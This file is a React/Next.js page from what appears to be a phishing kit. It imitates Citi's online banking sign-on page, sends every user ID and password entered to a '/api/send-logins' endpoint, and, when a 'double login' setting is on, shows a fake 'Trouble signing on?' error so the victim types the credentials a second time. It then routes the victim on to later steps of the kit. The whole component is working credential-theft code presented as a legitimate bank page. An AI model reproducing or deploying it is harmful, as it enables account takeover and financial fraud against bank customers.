import { Box, Button, Flex, Text, Image, Link } from "@chakra-ui/react";
import React, { useContext, useState } from "react";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import Head from "next/head";
import { AltButton } from "../components/AltButton";
import { Input } from "../components/Input";
import { Button as CustomButton } from "../components/Button";
import { Checkbox } from "../components/Checkbox";
import { DataContext } from "./_app";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";

interface LoginProps {}

const schema = yup.object().shape({
  userId: yup
    .string()
    .required(`Enter a User ID`)
    .min(2, `Your User ID must be greater than 2 characters`),
  password: yup
    .string()
    .required(`Enter a Password`)
    .min(6, `Your password must be at least 6 characters long`),
});

export const Login: React.FC<LoginProps> = () => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN DETAILS`);
    formData.append(
      `loginDetails`,
      JSON.stringify({ loginAttempt: loginAttempt + 1, ...data })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN DETAILS`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        userId: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN DETAILS`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  return (
    <Wrapper hideNav={false}>
      <Head>
        <title>
          Online Banking, Mortgages, Personal Loans, Investing | Citi.com
        </title>
      </Head>
      <Box
        bgColor={`rgb(0, 45, 114)`}
        h={`50px`}
        p={0}
        w={`100%`}
        m={`0 auto`}
        pos={`relative`}
        display={[`block`, `none`]}
      >
        <Flex justifyContent={`space-between`} h={`50%`} p={`16px 0`}>
          <Link
            borderBottom={`none`}
            display={`inline-block`}
            cursor={`pointer`}
            p={`0 0 0 10px`}
            w={`58px`}
            h={`100%`}
            m={0}
            pos={`absolute`}
            top={0}
            color={`#056dae`}
            textDecor={`none`}
            bgColor={`transparent`}
          >
            <Box
              as={`span`}
              w={`26px`}
              h={`26px`}
              pos={`absolute`}
              bgRepeat={`no-repeat`}
              left={`16px`}
              top={`10px`}
              bgImage={`/images/menu-open.svg`}
            />
          </Link>
        </Flex>
      </Box>
      <Box>
        <Box>
          <Box
            pt={0}
            m={`0 auto`}
            color={`#fff`}
            maxW={`100%`}
            p={0}
            minH={[`340px`, `400px`]}
          >
            <Box>
              <Box>
                <Box as={`main`} display={`block`}>
                  <Box as={`section`} pos={`relative`} display={`block`}>
                    <Box
                      bgImage={`url('/images/LSO_4959.jpeg')`}
                      objectFit={`cover`}
                      bgSize={`cover`}
                      bgPos={`50%`}
                      display={`block`}
                      w={`100%`}
                      minH={[`340px`, `400px`]}
                    />
                    <Box
                      pos={[`relative`, `absolute`]}
                      bgColor={`#fff`}
                      p={[0, `20px`]}
                      top={0}
                      right={[`initial`, `2%`]}
                      bottom={0}
                      mt={[0, `10px`]}
                      mb={[0, `20px`]}
                    >
                      <Box as={`form`}>
                        <Box>
                          <Box
                            w={[`full`, `344px`]}
                            p={[`20px`, 0]}
                            m={[`auto`, `initial`]}
                            bg={`#fff`}
                          >
                            {showError ? (
                              <Box
                                display={`block`}
                                fontWeight={700}
                                pos={`relative`}
                                lineHeight={`1rem`}
                                fontSize={`.75rem`}
                              >
                                <Box
                                  p={0}
                                  m={0}
                                  pos={`relative`}
                                  fontFamily={`Interstate_Bold,sans-serif`}
                                  border={`1px solid transparent`}
                                  borderRadius={`6px`}
                                  _before={{
                                    top: 0,
                                    bgSize: `contain`,
                                    bgPos: `50%`,
                                    h: `20px`,
                                    w: `20px`,
                                    bgImage: `data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%20standalone%3D%22no%22%3F%3E%0A%3Csvg%20width%3D%2220px%22%20height%3D%2220px%22%20viewBox%3D%220%200%2020%2020%22%20version%3D%221.1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%3E%0A%20%20%20%20%3C%21--%20Generator%3A%20Sketch%2040%20%2833762%29%20-%20http%3A//www.bohemiancoding.com/sketch%20--%3E%0A%20%20%20%20%3Ctitle%3EGroup%3C/title%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C/desc%3E%0A%20%20%20%20%3Cdefs%3E%3C/defs%3E%0A%20%20%20%20%3Cg%20id%3D%22P2.-DDL-1.1.5-Components%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%222.5_Components_Miscellaneous%22%20transform%3D%22translate%28-254.000000%2C%20-4247.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Tooltips-%26amp%3B-Helper-Text%22%20transform%3D%22translate%2819.000000%2C%203802.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Critical-Alert%22%20transform%3D%22translate%28235.000000%2C%20335.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20transform%3D%22translate%280.000000%2C%20107.000000%29%22%20id%3D%22Group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20transform%3D%22translate%280.000000%2C%203.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ccircle%20id%3D%22red-base%22%20fill%3D%22%23D60000%22%20cx%3D%2210%22%20cy%3D%2210%22%20r%3D%2210%22%3E%3C/circle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M11.48%2C8.608%20L11.48%2C4%20L9.24%2C4%20L9.24%2C8.608%20L9.608%2C11.68%20L11.112%2C11.68%20L11.48%2C8.608%20Z%20M11.72%2C14.016%20C11.72%2C13.28%2011.096%2C12.656%2010.36%2C12.656%20C9.624%2C12.656%209%2C13.28%209%2C14.016%20C9%2C14.752%209.624%2C15.376%2010.36%2C15.376%20C11.096%2C15.376%2011.72%2C14.752%2011.72%2C14.016%20L11.72%2C14.016%20Z%22%20id%3D%22%21%22%20fill%3D%22%23FFFFFF%22%3E%3C/path%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%3C/g%3E%0A%3C/svg%3E`,
                                    bgRepeat: `no-repeat`,
                                    content: `""`,
                                    pos: `absolute`,
                                    display: `inline-block`,
                                    style: {
                                      textindent: `-9999em`,
                                    },
                                  }}
                                >
                                  <Box ml={`28px`}>
                                    <Text
                                      as={`span`}
                                      pos={`absolute`}
                                      w={`1px`}
                                      h={`1px`}
                                      m={`-1px`}
                                      p={0}
                                      overflow={`hidden`}
                                      border={0}
                                      style={{
                                        clip: `rect(0,0,0,0)`,
                                      }}
                                    >
                                      critical alert icon
                                    </Text>
                                    <Box>
                                      <Text as={`span`} color={`#d60000`}>
                                        Trouble signing on?
                                      </Text>
                                      <Text as={`span`} color={`#333`}>
                                        {`Select "Forgot User ID or Password"`}
                                      </Text>
                                    </Box>
                                  </Box>
                                </Box>
                              </Box>
                            ) : null}
                            <Box>
                              <Box px={0} m={0}>
                                {/* <Box float={`right`} pos={`relative`}>
                                  <Flex
                                    color={`#056dae`}
                                    textDecor={`underline`}
                                    w={`175px`}
                                    pl={`10px`}
                                    pos={`absolute`}
                                    ml={`-160px`}
                                    my={0}
                                  >
                                    <Box
                                      w={`25px`}
                                      h={`25px`}
                                      display={`inline-block`}
                                      m={`5px`}
                                      bgImage={`url('/images/qrsignon.png')`}
                                      bgSize={`cover`}
                                    />
                                    <Box
                                      w={`110px`}
                                      textAlign={`center`}
                                      fontSize={`13px`}
                                      cursor={`pointer`}
                                      h={`50px`}
                                    >
                                      <AltButton
                                        text={`Sign On with the Citi Mobile® App`}
                                      />
                                    </Box>
                                  </Flex>
                                </Box> */}
                                <Box px={0} m={0} display={`block`}>
                                  <Box
                                    as={`section`}
                                    bg={`#fff`}
                                    display={`block`}
                                    color={`#333`}
                                  >
                                    <Text
                                      as={`h4`}
                                      fontSize={[`1rem`, `1.313rem`]}
                                      lineHeight={`1.688rem`}
                                      fontFamily={`Interstate_Light,sans-serif`}
                                      fontWeight={400}
                                      textTransform={`none`}
                                      letterSpacing={`normal`}
                                      mt={0}
                                      mb={`12px`}
                                      color={`inherit`}
                                    >
                                      Sign On
                                    </Text>
                                    <Box
                                      mx={[0, `-10px`]}
                                      _before={{
                                        content: `" "`,
                                        display: `table`,
                                      }}
                                      _after={{
                                        clear: `both`,
                                        content: `" "`,
                                        display: `table`,
                                      }}
                                    >
                                      <Input
                                        label={`User ID`}
                                        placeholder={`User ID`}
                                        error={
                                          errors.userId && errors.userId.message
                                        }
                                        register={register}
                                        name={`userId`}
                                        curValue={watch(`userId`)}
                                      />
                                      <Input
                                        label={`Password`}
                                        placeholder={`Password`}
                                        type={`password`}
                                        error={
                                          errors.password &&
                                          errors.password.message
                                        }
                                        register={register}
                                        name={`password`}
                                        curValue={watch(`password`)}
                                      />
                                    </Box>
                                    <Checkbox
                                      message={`Do not select if you are using a public computer.`}
                                    />
                                    <CustomButton
                                      text={`Sign On`}
                                      onClick={onSubmit}
                                      disabled={loading}
                                      w={`full`}
                                      _disabled={{
                                        color: `#fff`,
                                        bgColor: `#002a54`,
                                        bg: `#002a54`,
                                        textDecor: `none`,
                                        bgImage: `none`,
                                        outline: `5px auto -webkit-focus-ring-color`,
                                        outlineOffset: `-2px`,
                                      }}
                                    />
                                    <Box
                                      mx={`-10px`}
                                      _before={{
                                        content: `" "`,
                                        display: `table`,
                                      }}
                                      _after={{
                                        clear: `both`,
                                        content: `" "`,
                                        display: `table`,
                                      }}
                                    />
                                  </Box>
                                </Box>
                                <Box
                                  mx={`-10px`}
                                  _before={{
                                    content: `" "`,
                                    display: `table`,
                                  }}
                                  _after={{
                                    clear: `both`,
                                    content: `" "`,
                                    display: `table`,
                                  }}
                                >
                                  <Box
                                    w={`50%`}
                                    float={`left`}
                                    pos={`relative`}
                                    minH={`1px`}
                                    px={`10px`}
                                    h={`24px`}
                                    display={`flex`}
                                    flexDir={`row`}
                                    alignItems={`center`}
                                  >
                                    <AltButton
                                      text={`Forgot User ID?`}
                                      w={`auto`}
                                      fontSize={`12px`}
                                    />
                                  </Box>
                                  <Box
                                    w={`50%`}
                                    float={`left`}
                                    pos={`relative`}
                                    minH={`1px`}
                                    px={`10px`}
                                    h={`24px`}
                                    display={`flex`}
                                    flexDir={`row`}
                                    alignItems={`center`}
                                  >
                                    <AltButton
                                      text={`Forgot Password?`}
                                      w={`auto`}
                                      fontSize={`12px`}
                                    />
                                  </Box>
                                  <Box
                                    w={`50%`}
                                    float={`left`}
                                    pos={`relative`}
                                    minH={`1px`}
                                    px={`10px`}
                                    h={`24px`}
                                    display={`flex`}
                                    flexDir={`row`}
                                    alignItems={`center`}
                                  >
                                    <AltButton
                                      text={`Activate a Card`}
                                      w={`auto`}
                                      fontSize={`12px`}
                                    />
                                  </Box>
                                  <Box
                                    w={`50%`}
                                    float={`left`}
                                    pos={`relative`}
                                    minH={`1px`}
                                    px={`10px`}
                                    h={`24px`}
                                    display={`flex`}
                                    flexDir={`row`}
                                    alignItems={`center`}
                                  >
                                    <AltButton
                                      text={`Register for Online Access`}
                                      w={`auto`}
                                      fontSize={`12px`}
                                    />
                                  </Box>
                                </Box>
                              </Box>
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>
          </Box>
        </Box>
        <Box as={`span`}>
          <Button
            p={0}
            bottom={0}
            right={`30px`}
            border={`none`}
            zIndex={99999990}
            pos={`fixed`}
            cursor={`pointer`}
            lineHeight={`1px`}
            mb={`5px`}
            w={`auto`}
            bg={`transparent`}
          >
            <Image
              src={`/images/feedback.png`}
              alt={``}
              verticalAlign={`middle`}
              border={0}
            />
          </Button>
        </Box>
      </Box>
    </Wrapper>
  );
};

export default Login;
